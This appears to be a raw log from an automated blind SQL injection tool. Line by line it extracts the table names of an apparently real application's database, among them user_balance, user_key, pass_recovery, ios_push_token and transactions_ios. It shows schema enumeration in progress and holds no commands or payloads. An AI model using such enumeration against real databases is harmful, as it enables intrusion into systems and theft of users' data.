+[02:38:01] [INFO] retrieved: ______________[02:38:01] [INFO] retrieved: [02:38:25] [INFO] retrieved: __e___________ 1/14 (7%)[02:38:26] [INFO] retrieved: __ee__________ 2/14 (14%)[02:38:33] [INFO] retrieved: f_ee__________ 3/14 (21%)[02:38:33] [INFO] retrieved: free__________ 4/14 (28%)[02:38:49] [INFO] retrieved: free_u________ 5/14 (35%)[02:38:50] [INFO] retrieved: free_u_e______ 6/14 (42%)[02:38:55] [INFO] retrieved: free_use______ 7/14 (50%)[02:39:04] [INFO] retrieved: free_use______ 8/14 (57%)[02:39:10] [INFO] retrieved: free_user_____ 9/14 (64%)[02:39:16] [INFO] retrieved: free_user__a__ 10/14 (71%)[02:39:24] [INFO] retrieved: free_user_la__ 11/14 (78%)[02:39:30] [INFO] retrieved: free_user_la__ 12/14 (85%)[02:39:34] [INFO] retrieved: free_user_la_g 13/14 (92%)[02:39:35] [INFO] retrieved: free_user_lang             [02:39:35] [INFO] retrieved: free_user_lang
+[02:39:35] [INFO] retrieving the length of query output
+[02:39:35] [INFO] retrieved: 8
+[02:39:44] [INFO] retrieved: ________[02:39:44] [INFO] retrieved: [02:40:10] [INFO] retrieved: ___e____ 1/8 (12%)[02:40:11] [INFO] retrieved: __ee____ 2/8 (25%)[02:40:14] [INFO] retrieved: _ree____ 3/8 (37%)[02:40:18] [INFO] retrieved: free____ 4/8 (50%)[02:40:24] [INFO] retrieved: free__a_ 5/8 (62%)[02:40:26] [INFO] retrieved: free_ea_ 6/8 (75%)[02:40:30] [INFO] retrieved: freerea_ 7/8 (87%)[02:40:33] [INFO] retrieved: freeread           [02:40:33] [INFO] retrieved: freeread
+[02:40:33] [INFO] retrieving the length of query output
+[02:40:33] [INFO] retrieved: 14
+[02:40:41] [INFO] retrieved: ______________[02:40:41] [INFO] retrieved: [02:41:08] [INFO] retrieved: i_____________ 1/14 (7%)[02:41:13] [INFO] retrieved: i_s___________ 2/14 (14%)[02:41:19] [INFO] retrieved: ios___________ 3/14 (21%)[02:41:20] [INFO] retrieved: ios___________ 4/14 (28%)[02:41:36] [INFO] retrieved: ios__u________ 5/14 (35%)[02:41:41] [INFO] retrieved: ios_pu________ 6/14 (42%)[02:41:43] [INFO] retrieved: ios_pus_______ 7/14 (50%)[02:41:57] [INFO] retrieved: ios_push______ 8/14 (57%)[02:42:05] [INFO] retrieved: ios_push_t____ 9/14 (64%)[02:42:17] [INFO] retrieved: ios_push_to___ 10/14 (71%)[02:42:24] [INFO] retrieved: ios_push_to___ 11/14 (78%)[02:42:25] [INFO] retrieved: ios_push_tok__ 12/14 (85%)[02:42:26] [INFO] retrieved: ios_push_toke_ 13/14 (92%)[02:42:33] [INFO] retrieved: ios_push_token             [02:42:33] [INFO] retrieved: ios_push_token
+[02:42:33] [INFO] retrieving the length of query output
+[02:42:33] [INFO] retrieved: 19
+[02:42:46] [INFO] retrieved: ___________________[02:42:46] [INFO] retrieved: [02:43:11] [INFO] retrieved: i__________________ 1/19 (5%)[02:43:15] [INFO] retrieved: i_s________________ 2/19 (10%)[02:43:24] [INFO] retrieved: i_s________________ 3/19 (15%)[02:43:24] [INFO] retrieved: ios________________ 4/19 (21%)[02:43:39] [INFO] retrieved: ios__u_____________ 5/19 (26%)[02:43:45] [INFO] retrieved: ios_pu_____________ 6/19 (31%)[02:43:55] [INFO] retrieved: ios_pus____________ 7/19 (36%)[02:44:00] [INFO] retrieved: ios_push___________ 8/19 (42%)[02:44:15] [INFO] retrieved: ios_push_t_________ 9/19 (47%)[02:44:23] [INFO] retrieved: ios_push_t_________ 10/19 (52%)[02:44:23] [INFO] retrieved: ios_push_to________ 11/19 (57%)[02:44:24] [INFO] retrieved: ios_push_tok_______ 12/19 (63%)[02:44:33] [INFO] retrieved: ios_push_toke______ 13/19 (68%)[02:44:46] [INFO] retrieved: ios_push_toke__f___ 14/19 (73%)[02:44:49] [INFO] retrieved: ios_push_token_f___ 15/19 (78%)[02:44:56] [INFO] retrieved: ios_push_token_fr__ 16/19 (84%)[02:45:00] [INFO] retrieved: ios_push_token_fre_ 17/19 (89%)[02:45:01] [INFO] retrieved: ios_push_token_fre_ 18/19 (94%)[02:45:02] [INFO] retrieved: ios_push_token_free             [02:45:02] [INFO] retrieved: ios_push_token_free
+[02:45:02] [INFO] retrieving the length of query output
+[02:45:02] [INFO] retrieved: 4
+[02:45:07] [INFO] retrieved: ____[02:45:07] [INFO] retrieved: [02:45:24] [INFO] retrieved: _a__ 1/4 (25%)[02:45:35] [INFO] retrieved: la__ 2/4 (50%)[02:45:35] [INFO] retrieved: la_g 3/4 (75%)[02:45:36] [INFO] retrieved: lang           [02:45:36] [INFO] retrieved: lang
+[02:45:36] [INFO] retrieving the length of query output
+[02:45:36] [INFO] retrieved: 5
+[02:45:44] [INFO] retrieved: _____[02:45:44] [INFO] retrieved: [02:46:04] [INFO] retrieved: _a___ 1/5 (20%)[02:46:09] [INFO] retrieved: _a_e_ 2/5 (40%)[02:46:12] [INFO] retrieved: _age_ 3/5 (60%)[02:46:19] [INFO] retrieved: page_ 4/5 (80%)[02:46:20] [INFO] retrieved: pages           [02:46:20] [INFO] retrieved: pages
+[02:46:20] [INFO] retrieving the length of query output
+[02:46:20] [INFO] retrieved: 13
+[02:46:33] [INFO] retrieved: _____________[02:46:33] [INFO] retrieved: [02:46:53] [INFO] retrieved: _a___________ 1/13 (7%)[02:47:05] [INFO] retrieved: _as__________ 2/13 (15%)[02:47:06] [INFO] retrieved: _ass_________ 3/13 (23%)[02:47:14] [INFO] retrieved: pass_________ 4/13 (30%)[02:47:22] [INFO] retrieved: pass__e______ 5/13 (38%)[02:47:29] [INFO] retrieved: pass_re______ 6/13 (46%)[02:47:30] [INFO] retrieved: pass_rec_____ 7/13 (53%)[02:47:31] [INFO] retrieved: pass_rec_____ 8/13 (61%)[02:47:46] [INFO] retrieved: pass_rec__e__ 9/13 (69%)[02:47:52] [INFO] retrieved: pass_reco_e__ 10/13 (76%)[02:47:52] [INFO] retrieved: pass_reco_er_ 11/13 (84%)[02:47:57] [INFO] retrieved: pass_recover_ 12/13 (92%)[02:48:00] [INFO] retrieved: pass_recovery             [02:48:00] [INFO] retrieved: pass_recovery
+[02:48:00] [INFO] retrieving the length of query output
+[02:48:00] [INFO] retrieved: 4
+[02:48:05] [INFO] retrieved: ____[02:48:05] [INFO] retrieved: [02:48:24] [INFO] retrieved: __a_ 1/4 (25%)[02:48:29] [INFO] retrieved: _ea_ 2/4 (50%)[02:48:31] [INFO] retrieved: rea_ 3/4 (75%)[02:48:32] [INFO] retrieved: read           [02:48:32] [INFO] retrieved: read
+[02:48:32] [INFO] retrieving the length of query output
+[02:48:32] [INFO] retrieved: 12
+[02:48:43] [INFO] retrieved: ____________[02:48:43] [INFO] retrieved: [02:49:02] [INFO] retrieved: __a_________ 1/12 (8%)[02:49:07] [INFO] retrieved: _ea_________ 2/12 (16%)[02:49:08] [INFO] retrieved: rea_________ 3/12 (25%)[02:49:15] [INFO] retrieved: read________ 4/12 (33%)[02:49:31] [INFO] retrieved: read__r_____ 5/12 (41%)[02:49:32] [INFO] retrieved: read__re____ 6/12 (50%)[02:49:43] [INFO] retrieved: read_pre____ 7/12 (58%)[02:49:46] [INFO] retrieved: read_pre____ 8/12 (66%)[02:49:48] [INFO] retrieved: read_pre_i__ 9/12 (75%)[02:49:53] [INFO] retrieved: read_premi__ 10/12 (83%)[02:49:58] [INFO] retrieved: read_premiu_ 11/12 (91%)[02:50:00] [INFO] retrieved: read_premium             [02:50:00] [INFO] retrieved: read_premium
+[02:50:00] [INFO] retrieving the length of query output
+[02:50:00] [INFO] retrieved: 8
+[02:50:09] [INFO] retrieved: ________[02:50:09] [INFO] retrieved: [02:50:33] [INFO] retrieved: ___e____ 1/8 (12%)[02:50:33] [INFO] retrieved: _e_e____ 2/8 (25%)[02:50:39] [INFO] retrieved: _efe____ 3/8 (37%)[02:50:41] [INFO] retrieved: refe____ 4/8 (50%)[02:50:46] [INFO] retrieved: refe_a__ 5/8 (62%)[02:50:52] [INFO] retrieved: refera__ 6/8 (75%)[02:50:57] [INFO] retrieved: refera_s 7/8 (87%)[02:50:57] [INFO] retrieved: referals           [02:50:57] [INFO] retrieved: referals
+[02:50:57] [INFO] retrieving the length of query output
+[02:50:57] [INFO] retrieved: 14
+[02:51:06] [INFO] retrieved: ______________[02:51:06] [INFO] retrieved: [02:51:30] [INFO] retrieved: ___e__________ 1/14 (7%)[02:51:31] [INFO] retrieved: _e_e__________ 2/14 (14%)[02:51:39] [INFO] retrieved: re_e__________ 3/14 (21%)[02:51:40] [INFO] retrieved: rete__________ 4/14 (28%)[02:51:58] [INFO] retrieved: rete__i_______ 5/14 (35%)[02:52:03] [INFO] retrieved: rete_ti_______ 6/14 (42%)[02:52:03] [INFO] retrieved: retenti_______ 7/14 (50%)[02:52:10] [INFO] retrieved: retentio______ 8/14 (57%)[02:52:24] [INFO] retrieved: retentio___a__ 9/14 (64%)[02:52:25] [INFO] retrieved: retentio__da__ 10/14 (71%)[02:52:25] [INFO] retrieved: retention_da__ 11/14 (78%)[02:52:34] [INFO] retrieved: retention_da_1 12/14 (85%)[02:52:38] [INFO] retrieved: retention_da_1 13/14 (92%)[02:52:39] [INFO] retrieved: retention_day1             [02:52:39] [INFO] retrieved: retention_day1
+[02:52:39] [INFO] retrieving the length of query output
+[02:52:39] [INFO] retrieved: 16
+[02:52:52] [INFO] retrieved: ________________[02:52:52] [INFO] retrieved: [02:53:17] [INFO] retrieved: _e______________ 1/16 (6%)[02:53:18] [INFO] retrieved: _e_e____________ 2/16 (12%)[02:53:24] [INFO] retrieved: re_e____________ 3/16 (18%)[02:53:27] [INFO] retrieved: rete____________ 4/16 (25%)[02:53:40] [INFO] retrieved: rete__i_________ 5/16 (31%)[02:53:47] [INFO] retrieved: rete_ti_________ 6/16 (37%)[02:53:48] [INFO] retrieved: retenti_________ 7/16 (43%)[02:53:56] [INFO] retrieved: retentio________ 8/16 (50%)[02:54:11] [INFO] retrieved: retention_______ 9/16 (56%)[02:54:12] [INFO] retrieved: retention_m_____ 10/16 (62%)[02:54:27] [INFO] retrieved: retention_mo____ 11/16 (68%)[02:54:27] [INFO] retrieved: retention_mo____ 12/16 (75%)[02:54:40] [INFO] retrieved: retention_mo___1 13/16 (81%)[02:54:40] [INFO] retrieved: retention_mo_t_1 14/16 (87%)[02:54:41] [INFO] retrieved: retention_mont_1 15/16 (93%)[02:54:46] [INFO] retrieved: retention_month1             [02:54:46] [INFO] retrieved: retention_month1
+[02:54:46] [INFO] retrieving the length of query output
+[02:54:46] [INFO] retrieved: 15
+[02:54:58] [INFO] retrieved: _______________[02:54:58] [INFO] retrieved: [02:55:23] [INFO] retrieved: _e_____________ 1/15 (6%)[02:55:23] [INFO] retrieved: _e_e___________ 2/15 (13%)[02:55:27] [INFO] retrieved: re_e___________ 3/15 (20%)[02:55:33] [INFO] retrieved: rete___________ 4/15 (26%)[02:55:42] [INFO] retrieved: rete__i________ 5/15 (33%)[02:55:51] [INFO] retrieved: rete_ti________ 6/15 (40%)[02:55:52] [INFO] retrieved: retenti________ 7/15 (46%)[02:56:01] [INFO] retrieved: retentio_______ 8/15 (53%)[02:56:07] [INFO] retrieved: retention______ 9/15 (60%)[02:56:17] [INFO] retrieved: retention__e___ 10/15 (66%)[02:56:22] [INFO] retrieved: retention_we___ 11/15 (73%)[02:56:26] [INFO] retrieved: retention_wee__ 12/15 (80%)[02:56:31] [INFO] retrieved: retention_wee__ 13/15 (86%)[02:56:31] [INFO] retrieved: retention_wee_1 14/15 (93%)[02:56:34] [INFO] retrieved: retention_week1             [02:56:34] [INFO] retrieved: retention_week1
+[02:56:34] [INFO] retrieving the length of query output
+[02:56:34] [INFO] retrieved: 14
+[02:56:42] [INFO] retrieved: ______________[02:56:42] [INFO] retrieved: [02:57:02] [INFO] retrieved: __a___________ 1/14 (7%)[02:57:11] [INFO] retrieved: s_a___________ 2/14 (14%)[02:57:11] [INFO] retrieved: s_ar__________ 3/14 (21%)[02:57:17] [INFO] retrieved: shar__________ 4/14 (28%)[02:57:19] [INFO] retrieved: share_________ 5/14 (35%)[02:57:34] [INFO] retrieved: share_s_______ 6/14 (42%)[02:57:35] [INFO] retrieved: share_se______ 7/14 (50%)[02:57:41] [INFO] retrieved: share_ser_____ 8/14 (57%)[02:57:51] [INFO] retrieved: share_ser_i___ 9/14 (64%)[02:57:53] [INFO] retrieved: share_ser_i___ 10/14 (71%)[02:57:58] [INFO] retrieved: share_ser_ic__ 11/14 (78%)[02:58:00] [INFO] retrieved: share_servic__ 12/14 (85%)[02:58:04] [INFO] retrieved: share_service_ 13/14 (92%)[02:58:05] [INFO] retrieved: share_services             [02:58:05] [INFO] retrieved: share_services
+[02:58:05] [INFO] retrieving the length of query output
+[02:58:05] [INFO] retrieved: 6
+[02:58:15] [INFO] retrieved: ______[02:58:15] [INFO] retrieved: [02:58:35] [INFO] retrieved: __a___ 1/6 (16%)[02:58:47] [INFO] retrieved: __ar__ 2/6 (33%)[02:58:47] [INFO] retrieved: s_ar__ 3/6 (50%)[02:58:49] [INFO] retrieved: s_are_ 4/6 (66%)[02:58:50] [INFO] retrieved: share_ 5/6 (83%)[02:58:56] [INFO] retrieved: shared           [02:58:56] [INFO] retrieved: shared
+[02:58:56] [INFO] retrieving the length of query output
+[02:58:56] [INFO] retrieved: 6
+[02:59:06] [INFO] retrieved: ______[02:59:06] [INFO] retrieved: [02:59:32] [INFO] retrieved: _i____ 1/6 (16%)[02:59:35] [INFO] retrieved: _ig___ 2/6 (33%)[02:59:36] [INFO] retrieved: sig___ 3/6 (50%)[02:59:40] [INFO] retrieved: sign__ 4/6 (66%)[02:59:46] [INFO] retrieved: signu_ 5/6 (83%)[02:59:52] [INFO] retrieved: signup           [02:59:52] [INFO] retrieved: signup
+[02:59:52] [INFO] retrieving the length of query output
+[02:59:52] [INFO] retrieved: 10
+[03:00:03] [INFO] retrieved: __________[03:00:03] [INFO] retrieved: [03:00:23] [INFO] retrieved: __a_______ 1/10 (10%)[03:00:32] [INFO] retrieved: s_a_______ 2/10 (20%)[03:00:38] [INFO] retrieved: s_at______ 3/10 (30%)[03:00:39] [INFO] retrieved: stat______ 4/10 (40%)[03:00:56] [INFO] retrieved: stat__i___ 5/10 (50%)[03:01:02] [INFO] retrieved: stat_vi___ 6/10 (60%)[03:01:02] [INFO] retrieved: stat_vi___ 7/10 (70%)[03:01:03] [INFO] retrieved: stat_vis__ 8/10 (80%)[03:01:09] [INFO] retrieved: stat_visi_ 9/10 (90%)[03:01:15] [INFO] retrieved: stat_visit             [03:01:15] [INFO] retrieved: stat_visit
+[03:01:15] [INFO] retrieving the length of query output
+[03:01:15] [INFO] retrieved: 15
+[03:01:26] [INFO] retrieved: _______________[03:01:26] [INFO] retrieved: [03:01:46] [INFO] retrieved: __a____________ 1/15 (6%)[03:01:57] [INFO] retrieved: s_a____________ 2/15 (13%)[03:02:05] [INFO] retrieved: s_at___________ 3/15 (20%)[03:02:05] [INFO] retrieved: stat___________ 4/15 (26%)[03:02:23] [INFO] retrieved: stat__i________ 5/15 (33%)[03:02:27] [INFO] retrieved: stat__i________ 6/15 (40%)[03:02:28] [INFO] retrieved: stat_vi________ 7/15 (46%)[03:02:28] [INFO] retrieved: stat_vis_______ 8/15 (53%)[03:02:40] [INFO] retrieved: stat_visi______ 9/15 (60%)[03:02:54] [INFO] retrieved: stat_visit_____ 10/15 (66%)[03:02:54] [INFO] retrieved: stat_visit_t___ 11/15 (73%)[03:02:57] [INFO] retrieved: stat_visit_ti__ 12/15 (80%)[03:03:08] [INFO] retrieved: stat_visit_ti__ 13/15 (86%)[03:03:09] [INFO] retrieved: stat_visit_ti_e 14/15 (93%)[03:03:11] [INFO] retrieved: stat_visit_time             [03:03:11] [INFO] retrieved: stat_visit_time
+[03:03:11] [INFO] retrieving the length of query output
+[03:03:11] [INFO] retrieved: 4
+[03:03:16] [INFO] retrieved: ____[03:03:16] [INFO] retrieved: [03:03:40] [INFO] retrieved: _e__ 1/4 (25%)[03:03:46] [INFO] retrieved: _es_ 2/4 (50%)[03:03:49] [INFO] retrieved: tes_ 3/4 (75%)[03:03:49] [INFO] retrieved: test           [03:03:49] [INFO] retrieved: test
+[03:03:49] [INFO] retrieving the length of query output
+[03:03:49] [INFO] retrieved: 14
+[03:03:57] [INFO] retrieved: ______________[03:03:57] [INFO] retrieved: [03:04:17] [INFO] retrieved: __a___________ 1/14 (7%)[03:04:22] [INFO] retrieved: __ac__________ 2/14 (14%)[03:04:25] [INFO] retrieved: _rac__________ 3/14 (21%)[03:04:31] [INFO] retrieved: trac__________ 4/14 (28%)[03:04:40] [INFO] retrieved: track_________ 5/14 (35%)[03:04:42] [INFO] retrieved: track_c_______ 6/14 (42%)[03:04:53] [INFO] retrieved: track_cr______ 7/14 (50%)[03:05:00] [INFO] retrieved: track_cr______ 8/14 (57%)[03:05:08] [INFO] retrieved: track_cro_____ 9/14 (64%)[03:05:08] [INFO] retrieved: track_cron____ 10/14 (71%)[03:05:17] [INFO] retrieved: track_cronj___ 11/14 (78%)[03:05:22] [INFO] retrieved: track_cronj_b_ 12/14 (85%)[03:05:25] [INFO] retrieved: track_cronjob_ 13/14 (92%)[03:05:26] [INFO] retrieved: track_cronjobs             [03:05:26] [INFO] retrieved: track_cronjobs
+[03:05:26] [INFO] retrieving the length of query output
+[03:05:26] [INFO] retrieved: 20
+[03:05:40] [INFO] retrieved: ____________________[03:05:40] [INFO] retrieved: [03:06:00] [INFO] retrieved: __a_________________ 1/20 (5%)[03:06:02] [INFO] retrieved: __ac________________ 2/20 (10%)[03:06:10] [INFO] retrieved: _rac________________ 3/20 (15%)[03:06:17] [INFO] retrieved: trac________________ 4/20 (20%)[03:06:19] [INFO] retrieved: track_______________ 5/20 (25%)[03:06:35] [INFO] retrieved: track_s_____________ 6/20 (30%)[03:06:42] [INFO] retrieved: track_s_____________ 7/20 (35%)[03:06:49] [INFO] retrieved: track_s_o___________ 8/20 (40%)[03:06:54] [INFO] retrieved: track_spo___________ 9/20 (45%)[03:07:04] [INFO] retrieved: track_spo_s_________ 10/20 (50%)[03:07:04] [INFO] retrieved: track_spons_________ 11/20 (55%)[03:07:13] [INFO] retrieved: track_spons_r_______ 12/20 (60%)[03:07:15] [INFO] retrieved: track_sponsor_______ 13/20 (65%)[03:07:22] [INFO] retrieved: track_sponsore______ 14/20 (70%)[03:07:28] [INFO] retrieved: track_sponsored_____ 15/20 (75%)[03:07:39] [INFO] retrieved: track_sponsored__i__ 16/20 (80%)[03:07:43] [INFO] retrieved: track_sponsored_ti__ 17/20 (85%)[03:07:52] [INFO] retrieved: track_sponsored_ti_e 18/20 (90%)[03:07:52] [INFO] retrieved: track_sponsored_tile 19/20 (95%)[03:07:52] [INFO] retrieved: track_sponsored_tile             [03:07:52] [INFO] retrieved: track_sponsored_tile
+[03:07:52] [INFO] retrieving the length of query output
+[03:07:52] [INFO] retrieved: 16
+[03:08:06] [INFO] retrieved: ________________[03:08:06] [INFO] retrieved: [03:08:26] [INFO] retrieved: __a_____________ 1/16 (6%)[03:08:37] [INFO] retrieved: _ra_____________ 2/16 (12%)[03:08:40] [INFO] retrieved: tra_____________ 3/16 (18%)[03:08:44] [INFO] retrieved: tran____________ 4/16 (25%)[03:08:47] [INFO] retrieved: trans___________ 5/16 (31%)[03:08:49] [INFO] retrieved: transa__________ 6/16 (37%)[03:08:57] [INFO] retrieved: transac_________ 7/16 (43%)[03:09:05] [INFO] retrieved: transac_i_______ 8/16 (50%)[03:09:10] [INFO] retrieved: transacti_______ 9/16 (56%)[03:09:17] [INFO] retrieved: transactio______ 10/16 (62%)[03:09:25] [INFO] retrieved: transaction_____ 11/16 (68%)[03:09:26] [INFO] retrieved: transactions____ 12/16 (75%)[03:09:34] [INFO] retrieved: transactions_i__ 13/16 (81%)[03:09:45] [INFO] retrieved: transactions_i_s 14/16 (87%)[03:09:46] [INFO] retrieved: transactions_i_s 15/16 (93%)[03:09:48] [INFO] retrieved: transactions_ios             [03:09:48] [INFO] retrieved: transactions_ios
+[03:09:48] [INFO] retrieving the length of query output
+[03:09:48] [INFO] retrieved: 7
+[03:09:56] [INFO] retrieved: _______[03:09:56] [INFO] retrieved: [03:10:24] [INFO] retrieved: u______ 1/7 (14%)[03:10:25] [INFO] retrieved: ur_____ 2/7 (28%)[03:10:31] [INFO] retrieved: ur_n___ 3/7 (42%)[03:10:31] [INFO] retrieved: urln___ 4/7 (57%)[03:10:35] [INFO] retrieved: urlna__ 5/7 (71%)[03:10:41] [INFO] retrieved: urlna_e 6/7 (85%)[03:10:41] [INFO] retrieved: urlname           [03:10:41] [INFO] retrieved: urlname
+[03:10:41] [INFO] retrieving the length of query output
+[03:10:41] [INFO] retrieved: 14
+[03:10:50] [INFO] retrieved: ______________[03:10:50] [INFO] retrieved: [03:11:21] [INFO] retrieved: _r____________ 1/14 (7%)[03:11:22] [INFO] retrieved: ur____________ 2/14 (14%)[03:11:29] [INFO] retrieved: url___________ 3/14 (21%)[03:11:29] [INFO] retrieved: urln__________ 4/14 (28%)[03:11:34] [INFO] retrieved: urlna_________ 5/14 (35%)[03:11:46] [INFO] retrieved: urlnam________ 6/14 (42%)[03:11:47] [INFO] retrieved: urlname_______ 7/14 (50%)[03:11:54] [INFO] retrieved: urlname_s_____ 8/14 (57%)[03:12:09] [INFO] retrieved: urlname_s_____ 9/14 (64%)[03:12:11] [INFO] retrieved: urlname_s_u___ 10/14 (71%)[03:12:17] [INFO] retrieved: urlname_sou___ 11/14 (78%)[03:12:17] [INFO] retrieved: urlname_sour__ 12/14 (85%)[03:12:22] [INFO] retrieved: urlname_sourc_ 13/14 (92%)[03:12:23] [INFO] retrieved: urlname_source             [03:12:23] [INFO] retrieved: urlname_source
+[03:12:23] [INFO] retrieving the length of query output
+[03:12:23] [INFO] retrieved: 4
+[03:12:28] [INFO] retrieved: ____[03:12:28] [INFO] retrieved: [03:12:52] [INFO] retrieved: __e_ 1/4 (25%)[03:12:57] [INFO] retrieved: u_e_ 2/4 (50%)[03:12:57] [INFO] retrieved: use_ 3/4 (75%)[03:12:57] [INFO] retrieved: user           [03:12:57] [INFO] retrieved: user
+[03:12:57] [INFO] retrieving the length of query output
+[03:12:57] [INFO] retrieved: 13
+[03:13:10] [INFO] retrieved: _____________[03:13:10] [INFO] retrieved: [03:13:33] [INFO] retrieved: __e__________ 1/13 (7%)[03:13:35] [INFO] retrieved: u_e__________ 2/13 (15%)[03:13:40] [INFO] retrieved: use__________ 3/13 (23%)[03:13:41] [INFO] retrieved: user_________ 4/13 (30%)[03:13:46] [INFO] retrieved: user_a_______ 5/13 (38%)[03:14:02] [INFO] retrieved: user_ar______ 6/13 (46%)[03:14:03] [INFO] retrieved: user_ar_i____ 7/13 (53%)[03:14:09] [INFO] retrieved: user_arti____ 8/13 (61%)[03:14:15] [INFO] retrieved: user_arti____ 9/13 (69%)[03:14:19] [INFO] retrieved: user_artic___ 10/13 (76%)[03:14:25] [INFO] retrieved: user_artic_e_ 11/13 (84%)[03:14:27] [INFO] retrieved: user_article_ 12/13 (92%)[03:14:29] [INFO] retrieved: user_articles             [03:14:29] [INFO] retrieved: user_articles
+[03:14:29] [INFO] retrieving the length of query output
+[03:14:29] [INFO] retrieved: 12
+[03:14:40] [INFO] retrieved: ____________[03:14:40] [INFO] retrieved: [03:15:04] [INFO] retrieved: __e_________ 1/12 (8%)[03:15:11] [INFO] retrieved: u_e_________ 2/12 (16%)[03:15:11] [INFO] retrieved: u_er________ 3/12 (25%)[03:15:12] [INFO] retrieved: user________ 4/12 (33%)[03:15:22] [INFO] retrieved: user__a_____ 5/12 (41%)[03:15:26] [INFO] retrieved: user_ba_____ 6/12 (50%)[03:15:32] [INFO] retrieved: user_ba_a___ 7/12 (58%)[03:15:39] [INFO] retrieved: user_bala___ 8/12 (66%)[03:15:44] [INFO] retrieved: user_bala___ 9/12 (75%)[03:15:47] [INFO] retrieved: user_bala_c_ 10/12 (83%)[03:15:50] [INFO] retrieved: user_balanc_ 11/12 (91%)[03:15:52] [INFO] retrieved: user_balance             [03:15:52] [INFO] retrieved: user_balance
+[03:15:52] [INFO] retrieving the length of query output
+[03:15:52] [INFO] retrieved: 10
+[03:16:03] [INFO] retrieved: __________[03:16:03] [INFO] retrieved: [03:16:27] [INFO] retrieved: __e_______ 1/10 (10%)[03:16:32] [INFO] retrieved: u_e_______ 2/10 (20%)[03:16:32] [INFO] retrieved: u_er______ 3/10 (30%)[03:16:32] [INFO] retrieved: user______ 4/10 (40%)[03:16:48] [INFO] retrieved: user_b____ 5/10 (50%)[03:17:00] [INFO] retrieved: user_b_o__ 6/10 (60%)[03:17:01] [INFO] retrieved: user_blo__ 7/10 (70%)[03:17:05] [INFO] retrieved: user_blo__ 8/10 (80%)[03:17:07] [INFO] retrieved: user_blog_ 9/10 (90%)[03:17:12] [INFO] retrieved: user_blogs             [03:17:12] [INFO] retrieved: user_blogs
+[03:17:12] [INFO] retrieving the length of query output
+[03:17:12] [INFO] retrieved: 9
+[03:17:22] [INFO] retrieved: _________[03:17:22] [INFO] retrieved: [03:17:46] [INFO] retrieved: __e______ 1/9 (11%)[03:17:51] [INFO] retrieved: u_e______ 2/9 (22%)[03:17:55] [INFO] retrieved: u_er_____ 3/9 (33%)[03:17:55] [INFO] retrieved: user_____ 4/9 (44%)[03:18:07] [INFO] retrieved: user__a__ 5/9 (55%)[03:18:10] [INFO] retrieved: user_da__ 6/9 (66%)[03:18:16] [INFO] retrieved: user_da_a 7/9 (77%)[03:18:18] [INFO] retrieved: user_data 8/9 (88%)[03:18:20] [INFO] retrieved: user_data           [03:18:20] [INFO] retrieved: user_data
+[03:18:20] [INFO] retrieving the length of query output
+[03:18:20] [INFO] retrieved: 12
+[03:18:31] [INFO] retrieved: ____________[03:18:31] [INFO] retrieved: [03:18:55] [INFO] retrieved: __e_________ 1/12 (8%)[03:19:03] [INFO] retrieved: __er________ 2/12 (16%)[03:19:03] [INFO] retrieved: _ser________ 3/12 (25%)[03:19:04] [INFO] retrieved: user________ 4/12 (33%)[03:19:21] [INFO] retrieved: user__e_____ 5/12 (41%)[03:19:25] [INFO] retrieved: user_de_____ 6/12 (50%)[03:19:30] [INFO] retrieved: user_det____ 7/12 (58%)[03:19:31] [INFO] retrieved: user_deta___ 8/12 (66%)[03:19:33] [INFO] retrieved: user_deta___ 9/12 (75%)[03:19:39] [INFO] retrieved: user_detai__ 10/12 (83%)[03:19:46] [INFO] retrieved: user_detai_s 11/12 (91%)[03:19:48] [INFO] retrieved: user_details             [03:19:48] [INFO] retrieved: user_details
+[03:19:48] [INFO] retrieving the length of query output
+[03:19:48] [INFO] retrieved: 14
+[03:19:56] [INFO] retrieved: ______________[03:19:56] [INFO] retrieved: [03:20:20] [INFO] retrieved: __e___________ 1/14 (7%)[03:20:28] [INFO] retrieved: u_e___________ 2/14 (14%)[03:20:28] [INFO] retrieved: u_er__________ 3/14 (21%)[03:20:28] [INFO] retrieved: user__________ 4/14 (28%)[03:20:51] [INFO] retrieved: user_f________ 5/14 (35%)[03:20:57] [INFO] retrieved: user_fo_______ 6/14 (42%)[03:20:59] [INFO] retrieved: user_fol______ 7/14 (50%)[03:21:00] [INFO] retrieved: user_fol______ 8/14 (57%)[03:21:14] [INFO] retrieved: user_fol_b____ 9/14 (64%)[03:21:28] [INFO] retrieved: user_fol_bl___ 10/14 (71%)[03:21:29] [INFO] retrieved: user_fol_blo__ 11/14 (78%)[03:21:33] [INFO] retrieved: user_fol_blo__ 12/14 (85%)[03:21:34] [INFO] retrieved: user_fol_blog_ 13/14 (92%)[03:21:40] [INFO] retrieved: user_fol_blogs             [03:21:40] [INFO] retrieved: user_fol_blogs
+[03:21:40] [INFO] retrieving the length of query output
+[03:21:40] [INFO] retrieved: 8
+[03:21:50] [INFO] retrieved: ________[03:21:50] [INFO] retrieved: [03:22:15] [INFO] retrieved: __e_____ 1/8 (12%)[03:22:16] [INFO] retrieved: u_e_____ 2/8 (25%)[03:22:18] [INFO] retrieved: u_er____ 3/8 (37%)[03:22:19] [INFO] retrieved: user____ 4/8 (50%)[03:22:33] [INFO] retrieved: user__e_ 5/8 (62%)[03:22:39] [INFO] retrieved: user_ke_ 6/8 (75%)[03:22:46] [INFO] retrieved: user_key 7/8 (87%)[03:23:00] [INFO] retrieved: user_key           [03:23:00] [INFO] retrieved: user_key
+[03:23:00] [INFO] retrieving the length of query output
+[03:23:00] [INFO] retrieved: 9
+[03:23:10] [INFO] retrieved: _________[03:23:10] [INFO] retrieved: [03:23:35] [INFO] retrieved: __e______ 1/9 (11%)[03:23:41] [INFO] retrieved: u_e______ 2/9 (22%)[03:23:42] [INFO] retrieved: u_er_____ 3/9 (33%)[03:23:42] [INFO] retrieved: user_____ 4/9 (44%)[03:23:54] [INFO] retrieved: user__a__ 5/9 (55%)[03:24:10] [INFO] retrieved: user__an_ 6/9 (66%)[03:24:11] [INFO] retrieved: user_lan_ 7/9 (77%)[03:24:12] [INFO] retrieved: user_lang 8/9 (88%)[03:24:13] [INFO] retrieved: user_lang           [03:24:13] [INFO] retrieved: user_lang
+[03:24:13] [INFO] retrieving the length of query output
+[03:24:13] [INFO] retrieved: 13
